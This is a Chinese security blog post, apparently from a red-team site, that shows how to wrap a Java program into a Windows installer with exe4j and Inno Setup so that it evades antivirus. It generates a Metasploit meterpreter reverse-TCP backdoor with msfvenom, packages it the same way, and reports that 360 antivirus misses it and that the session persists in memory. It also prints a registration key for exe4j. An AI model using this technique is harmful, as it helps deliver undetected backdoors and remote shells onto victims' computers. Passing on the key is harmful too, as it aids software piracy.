@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>从Jar到Exe | rebootORZ Security</title>
+
+    
+<link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+<meta name="author" content="rebootORZ" />
+<meta name="description" content="前言 本文章的目的在于探索极端环境下，使用java编写木马代替常见Go、C&#43;&#43;、ps等后门的可能性，及免杀效果的探索。 环境 Macbook Catalina 10.15.5 Java 1.8.0_211 IDeaJ 2021.01 一个正" />
+
+
+
+<meta name="generator" content="Hugo 0.101.0" />
+
+<link rel="canonical" href="https://rebootorz.github.io/posts/%E4%BB%8Ejar%E5%88%B0exe/" />
+
+
+<meta property="og:title" content="从Jar到Exe" />
+<meta property="og:description" content="前言 本文章的目的在于探索极端环境下，使用java编写木马代替常见Go、C&#43;&#43;、ps等后门的可能性，及免杀效果的探索。 环境 Macbook Catalina 10.15.5 Java 1.8.0_211 IDeaJ 2021.01 一个正" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://rebootorz.github.io/posts/%E4%BB%8Ejar%E5%88%B0exe/" /><meta property="og:image" content="https://rebootorz.github.io/me/background.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-05T13:56:26+08:00" />
+<meta property="article:modified_time" content="2022-07-05T13:56:26+08:00" />
+
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://rebootorz.github.io/me/background.jpg"/>
+
+<meta name="twitter:title" content="从Jar到Exe"/>
+<meta name="twitter:description" content="前言 本文章的目的在于探索极端环境下，使用java编写木马代替常见Go、C&#43;&#43;、ps等后门的可能性，及免杀效果的探索。 环境 Macbook Catalina 10.15.5 Java 1.8.0_211 IDeaJ 2021.01 一个正"/>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.css" integrity="sha256-UXesixbeLkB/UYxVTzuj/gg3+LMzgwAmg3zD+C4ZASQ=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/css/OverlayScrollbars.min.css" integrity="sha256-WKijf8KI68sbq8Znd6yMepIuFF0wdWfIt6gk3JWcQfk=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  .ui.header a:not(.item, .ui.button):hover {
+    text-decoration: underline;
+  }
+
+  
+  a:not(.item, .ui.button) {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a:not(.item, .ui.button) {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: #fff;
+    
+
+    
+    background-image: url(/me/black_background.jpg);
+    
+  }
+  
+
+  
+  body.dark {
+    
+
+    
+    background-image: url(/me/light_background.jpeg);
+    
+  }
+  
+</style>
+
+
+    
+
+
+
+
+
+
+
+    
+    <link rel="stylesheet" href="/css/custom.css" />
+    
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary menu dream-menu dream-nav">
+
+  <a class="item dream-flip-toggle" title="翻转！">
+    <i class="large link bullseye icon"></i>
+  </a>
+  <a class="item" href="https://rebootorz.github.io" title="首页">
+    <i class="large link home icon"></i>
+  </a>
+  
+  <a class="item" onclick="themeSwitch(event)">
+    <i class="large link icon theme-switch"></i>
+  </a>
+  
+  
+  <a class="item" title="搜索" onclick="toggleSearch(event)">
+    <i class="large link search icon"></i>
+  </a>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui relaxed centered grid dream-grid dream-grid-single">
+  
+  
+  
+  
+
+  
+  <aside class="sixteen wide mobile sixteen wide tablet three wide computer column dream-single-aside">
+    
+    <div class="ui segment toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#环境">环境</a></li>
+    <li><a href="#实践">实践</a>
+      <ul>
+        <li><a href="#jar文件准备">Jar文件准备</a></li>
+        <li><a href="#第一阶段打包">第一阶段打包</a></li>
+        <li><a href="#第二阶段打包">第二阶段打包</a></li>
+        <li><a href="#免杀测试">免杀测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#结论">结论</a>
+      <ul>
+        <li><a href="#优点">优点</a></li>
+        <li><a href="#不足之处">不足之处</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+
+    
+  </aside>
+  
+  <div class="sixteen wide mobile sixteen wide tablet ten wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    <section class="ui segment">
+      <header>
+        <h1 class="ui large header">从Jar到Exe<span class="sub header">
+            <span class="left">
+              @
+              
+                
+                  rebootORZ
+                
+              
+
+              | 
+                  <span data-format="luxon">2022-07-05T13:56:26&#43;08:00</span>
+                
+
+              | 4 分钟阅读
+
+              
+            </span>
+
+            
+            <span class="dream-share">
+  <a href="#" class="save-as-image" title="保存为图片" onclick="savePostAsImg()">
+    <i class="save icon"></i>
+  </a>
+  <a href="https://twitter.com/intent/tweet?text=%e4%bb%8eJar%e5%88%b0Exe&url=https%3a%2f%2frebootorz.github.io%2fposts%2f%25E4%25BB%258Ejar%25E5%2588%25B0exe%2f" title="Twitter">
+    <i class="twitter icon"></i>
+  </a>
+  <a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frebootorz.github.io%2fposts%2f%25E4%25BB%258Ejar%25E5%2588%25B0exe%2f" title="Facebook">
+    <i class="facebook icon"></i>
+  </a>
+</span>
+
+            
+          </span>
+        </h1>
+      </header>
+
+      <article class="main">
+        
+
+        <h2 id="前言">前言</h2>
+<p>本文章的目的在于探索极端环境下，使用java编写木马代替常见Go、C++、ps等后门的可能性，及免杀效果的探索。</p>
+<h2 id="环境">环境</h2>
+<ul>
+<li>Macbook Catalina 10.15.5</li>
+<li>Java 1.8.0_211</li>
+<li>IDeaJ 2021.01</li>
+</ul>
+<ul>
+<li>
+<p>一个正常的jar文件</p>
+</li>
+<li>
+<p>exe4j</p>
+<p>一个将jar转换成exe的工具，链接：https://exe4j.apponic.com/ 注册码：L-g782dn2d-1f1yqxx1rv1sqd</p>
+</li>
+<li>
+<p>inno</p>
+<p>一个将依赖和exe一起打成一个安装程序的工具， 链接：https://jrsoftware.org/isdl.php</p>
+</li>
+</ul>
+<h2 id="实践">实践</h2>
+<h3 id="jar文件准备">Jar文件准备</h3>
+<p>​	简单写一个打印程序：</p>
+<p>enjoy.class</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">enjoy</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;rebootORZ...&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/imgs/image-20210830103156308.png" alt="image-20210830103156308"></p>
+<p>打包成jar后的效果：</p>
+<p><img src="/imgs/image-20210830102005675.png" alt="image-20210830102005675"></p>
+<h3 id="第一阶段打包">第一阶段打包</h3>
+<p>安装好exe4j如下：</p>
+<p><img src="/imgs/image-20210830102234683.png" alt="image-20210830102234683"></p>
+<p>直接 Next -&gt; Project type -&gt; &ldquo;JAR in EXE&rdquo; mode -&gt;Next</p>
+<p><img src="/imgs/image-20210830102349561.png" alt="image-20210830102349561"></p>
+<p>接着输入生成的应用名称和输出路径：</p>
+<p><img src="/imgs/image-20210830102527332.png" alt="image-20210830102527332"></p>
+<p>选择运行方式，根据实际情况，这里选择命令行的形式，下面有个配置图标的，这里不做设置：</p>
+<p><img src="/imgs/image-20210830103008233.png" alt="image-20210830103008233"></p>
+<p>下面需要设置一下兼容性Advanced Options</p>
+<p><img src="/imgs/image-20210830103043197.png" alt="image-20210830103043197"></p>
+<p>钩上即可</p>
+<p><img src="/imgs/image-20210830102901391.png" alt="image-20210830102901391"></p>
+<p>一路Next，然后到下面这步：</p>
+<p>在VM Parameters处填上：-Dfile.encoding=utf-8</p>
+<p><img src="/imgs/image-20210830103628878.png" alt="image-20210830103628878"></p>
+<p>然后点击右边的绿色加号添加jar包：</p>
+<p><img src="/imgs/image-20210830103702068.png" alt="image-20210830103702068"></p>
+<p>然后选择主类：</p>
+<p><img src="/imgs/image-20210830103746124.png" alt="image-20210830103746124"></p>
+<p>下一步填写系统jdk版本，和配置jre:</p>
+<p><img src="/imgs/image-20210830103929584.png" alt="image-20210830103929584"></p>
+<p>在输出目录下创建jre文件夹，并将jre的文件全部拷贝到该目录下：</p>
+<img src="/imgs/image-20210831104838307.png" alt="image-20210831104838307" style="zoom:50%;" />
+<p>选择jre</p>
+<p><img src="/imgs/image-20210831105102099.png" alt="image-20210831105102099"></p>
+<p>这一步的作用是让exe文件能够知道jre在哪里，在后面第二步打包的时候能够自己去这个路径找。</p>
+<p><img src="/imgs/image-20210830104526117.png" alt="image-20210830104526117"></p>
+<p>后面就一直点击Next直到完成即可：</p>
+<p><img src="/imgs/image-20210830105234001.png" alt="image-20210830105234001"></p>
+<p>这时候我们指定的输出目录下面会生成一个exe文件，此时该文件不是最终效果，因为前面指定的时候还只是指定了路径，但还没有将依赖打包到一起。</p>
+<p><img src="/imgs/image-20210830105309167.png" alt="image-20210830105309167"></p>
+<h3 id="第二阶段打包">第二阶段打包</h3>
+<p>这个阶段需要让exe和指定的jre打包成一体，需要用到inno</p>
+<p>File -&gt; Create</p>
+<p>输入应用名字，其他随意</p>
+<p><img src="/imgs/image-20210830111717944.png" alt="image-20210830111717944"></p>
+<p>添加文件：</p>
+<p><img src="/imgs/image-20210830111822640.png" alt="image-20210830111822640"></p>
+<p>一路Next，选择语言：</p>
+<p><img src="/imgs/image-20210830111922558.png" alt="image-20210830111922558"></p>
+<p>接着设置输出路径和文件名：</p>
+<p><img src="/imgs/image-20210830112009853.png" alt="image-20210830112009853"></p>
+<p><img src="/imgs/image-20210830112106557.png" alt="image-20210830112106557"></p>
+<p>这里提示是否马上进行编译，选择否，因为我们还需要进行一些修改：</p>
+<p><img src="/imgs/image-20210830112148848.png" alt="image-20210830112148848"></p>
+<p>在下图位置另起一行插入红框中的内容：</p>
+<p><img src="/imgs/image-20210830112430064.png" alt="image-20210830112430064"></p>
+<p>删掉下面这行：</p>
+<p><img src="/imgs/image-20210831111945603.png" alt="image-20210831111945603"></p>
+<p>修改内容，按这个格式：</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Source: &#34;前面创建的JRE路径\*&#34;; DestDir: &#34;{app}\{#MyJreName}&#34;; Flags: ignoreversion recursesubdirs createallsubdirs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/imgs/image-20210831110219519.png" alt="image-20210831110219519"></p>
+<p>点击绿色按钮进行编译，提示是否保存，根据实际情况选择即可：</p>
+<p><img src="/imgs/image-20210831110653975.png" alt="image-20210831110653975"></p>
+<p>等最终下面的绿色进度条走完即可：</p>
+<p><img src="/imgs/image-20210831110718372.png" alt="image-20210831110718372"></p>
+<p>运行结束后桌面生成了一个安装文件，文件名就是我们指定的文件名，程序会帮我们运行这个程序，安装即可</p>
+<p><img src="/imgs/image-20210830114004629.png" alt="image-20210830114004629"></p>
+<p>运行效果如图：</p>
+<p><img src="/imgs/image-20210830114435573.png" alt="image-20210830114435573"></p>
+<p>大小如下：</p>
+<p>安装包 - 48.9M</p>
+<img src="/imgs/image-20210830114508448.png" alt="image-20210830114508448" style="zoom:50%;" />
+<p>安装后 - 791M</p>
+<img src="/imgs/image-20210831111059325.png" alt="image-20210831111059325" style="zoom:50%;" />
+<p>由于需要将jre环境也打包进去，所以导致打包后的程序编的异常的大，所以一般不会用到这种方式，这个只能适用于极端环境。</p>
+<h3 id="免杀测试">免杀测试</h3>
+<p>生成默认的msf jar后门</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.81.1 LPORT=4444 x &gt;~/Desktop/TestJar.jar
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>监听：</p>
+<img src="/imgs/image-20210830160903428.png" alt="image-20210830160903428" style="zoom:50%;" />
+<p>不打包，直接运行TestJar.jar会立马报毒：</p>
+<img src="file:///Users/rebootorz/Documents/Markdown%E7%AC%94%E8%AE%B0/%E4%BB%8EJar%E5%88%B0Exe/imgs/image-20210830171638129.png?lastModify=1630315654" alt="image-20210830171638129" style="zoom:50%;" />
+<p>按照上面的方法对TestJar.jar进行打包，在没有杀软和java环境的机器上安装并运行，可以成功上线：</p>
+<p><img src="/imgs/image-20210830173105652.png" alt="image-20210830173105652"></p>
+<p>在安装了360的机器上测试：</p>
+<p>安装包查杀，未发现风险：</p>
+<img src="/imgs/image-20210830162146952.png" alt="image-20210830162146952" style="zoom:50%;" />
+<p>安装后的文件夹，未发现风险：
+<img src="/imgs/image-20210830162343110.png" alt="image-20210830162343110" style="zoom: 50%;" /></p>
+<p>运行安装后的程序：</p>
+<p>运行后不会马上出发告警</p>
+<p><img src="/imgs/image-20210830164405416.png" alt="image-20210830164405416"></p>
+<p>尝试执行命令后出发告警了：</p>
+<img src="/imgs/image-20210830164553491.png" alt="image-20210830164553491" style="zoom: 50%;" />
+<img src="/imgs/image-20210830165843925.png" alt="image-20210830165843925" style="zoom:50%;" />
+<p>可以看到，提示的是已经成功删除病毒文件(注意，这里删除的文件是.class文件&mdash;&ndash;java的类文件)，但我们回到我们的meterpreter，发现并没有掉线，且能够正常执行所有命令，后续不会再有告警：</p>
+<img src="/imgs/image-20210830170035943.png" alt="image-20210830170035943" style="zoom: 50%;" />
+<p>经过主动检测，除了普通的系统优化建议外，无法查杀出后门：</p>
+<img src="/imgs/image-20210830170517385.png" alt="image-20210830170517385" style="zoom:50%;" />
+<p>通过上面测试，说明即使恶意文件被删除了，但是我们的会话还是在线，且不会再触发告警或被主动检测出风险，说明我们的后门的恶意类已经被加载进了内存。</p>
+<p>从进程上看，只能看到有个java程序在运行：</p>
+<img src="/imgs/image-20210830170957777.png" alt="image-20210830170957777" style="zoom:50%;" />
+<p>如果杀软开启针对内存检测的功能则免杀效果会失效，例如开启360的网购模式：</p>
+<p>提示进程java.exe存在问题了</p>
+<img src="/imgs/image-20210831113234486.png" alt="image-20210831113234486"  />
+<h2 id="结论">结论</h2>
+<h3 id="优点">优点</h3>
+<p>1.使用msf直接生成，为进行任何处理的后门也能有效免杀</p>
+<p>2.运行后，即使被查杀一般也只是杀了恶意类文件payload.class，后台还会继续运行一个java进程，一般的方式看不出来这个异常。</p>
+<h3 id="不足之处">不足之处</h3>
+<p>1.文件较大，安装前40M+，安装后700M左右</p>
+<p>2.需要安装操作，所以就需要是能够远程桌面进行操作。</p>
+<p>3.免杀效果不完全，还是会触发告警。</p>
+<p>这个免杀方式只能说是一种思路，真正在实战中是否适用，还是得根据实际情况来判断。如果对payload进行处理、程序签名等，可以再提升一些免杀效果。</p>
+
+      </article>
+    </section>
+
+    
+
+    
+
+    
+  </div>
+</div>
+
+
+            <footer class="ui basic center aligned segment" style="background-color: transparent;">
+              
+              <p>© 2021 - 2022 rebootORZ Security</p>
+              
+
+              <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
+
+              
+            </footer>
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <header class="ui basic very padded segment dream-header">
+  
+  <div class="ui small circular image">
+    <img src="/me/gl.jpg" alt="avatar" />
+  </div>
+  
+
+  <div class="content">
+    <h1 class="ui medium header">rebootORZ Security , EXP Loading ...<span class="sub header">🦶走过的叫足迹 ，走不到叫憧憬。</span>
+    </h1>
+
+    <article class="ui horizontal list">
+      
+      <a class="item" href="/posts">
+        <i class="archive icon" title="归档"></i>
+      </a>
+      
+      <a class="item" href="/categories">
+        <i class="th list icon" title="所有分类"></i>
+      </a>
+      <a class="item" href="/tags">
+        <i class="tags icon" title="所有标签"></i>
+      </a>
+    </article>
+
+    
+    
+    
+    
+    
+      
+    
+    
+
+    
+
+    
+    
+    
+          <div class="dream-tags">
+          
+          
+          
+            <a class="ui label" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" title="红队技术">
+              红队技术
+            </a>
+          
+          </div>
+    
+
+    
+  </div>
+</header>
+
+
+<div class="ui relaxed grid dream-grid dream-back">
+  
+  
+  
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment">
+      <div class="ui medium header">社交链接</div>
+      <nav class="ui secondary menu dream-menu dream-socials">
+  
+  <a class="item" href="/index.xml">
+    <i class="large rss square icon" title="RSS"></i>
+  </a>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <a class="item" href="https://github.com/https://github.com/rebootORZ/" target="_blank">
+    <i class="large github icon" title="GitHub"></i>
+  </a>
+  
+
+  
+
+  
+
+  
+</nav>
+
+    </article>
+  </div>
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+    <article class="ui segment">
+      <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。<br /><br />背景使用了 <a href="https://www.pexels.com/zh-cn/" target="_blank">Pexels</a> 上 <a href="https://www.pexels.com/zh-cn/@minan1398" target="_blank">Min An</a> 拍摄的<a href="https://www.pexels.com/zh-cn/photo/1454794/" target="_blank">图片</a>。
+    </article>
+    
+  </div>
+
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.js" integrity="sha256-CgSoWC9w5wNmI1aN8dIMK+6DPelUEtvDr+Bc2m/0Nx8=" crossorigin="anonymous"></script>
+
+    
+    <div class="ui segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="搜索" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('https:\/\/rebootorz.github.io/index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: false,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+
+    <script>
+  window.background = "#fff"
+  window.defaultDark =  null 
+  window.backgroundDark =  null 
+  window.backgroundImageDark = "/me/light_background.jpeg"
+  window.darkNav =  true 
+  window.maxTags =  null 
+  window.hasTwitterEmbed =  null 
+  window.fixedNav =  null 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/js/jquery.overlayScrollbars.min.js" integrity="sha256-tBd38uWlvgfps3zHPrUb2ePBg+Z8EjMf0QloFONzpvU=" crossorigin="anonymous"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+
+
+<script src="https://cdn.jsdelivr.net/npm/luxon@1.26.0" integrity="sha256-4sbTzmCCW9LGrIh5OsN8V5Pfdad1F1MwhLAOyXKnsE0=" crossorigin="anonymous"></script>
+<script>
+  format()
+
+  function format() {
+    $('span[data-format="luxon"]').each(function () {
+      var date = $(this).text()
+
+      $(this).text(luxon.DateTime.fromISO(date, { locale: "zh" }).toFormat("yyyy年MM月dd日"))
+    })
+  }
+</script>
+
+
+
+<script src="/js/scrollToTop.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.0.0-rc.1/dist/html2canvas.min.js" integrity="sha256-uacRffSSMP9qpvNWhVmYLykBv9YKMA1d/VSIN1AmfyQ=" crossorigin="anonymous"></script>
+<script src="/js/post.js" defer></script>
+
+
+    
+
+    
+  </body>
+</html>
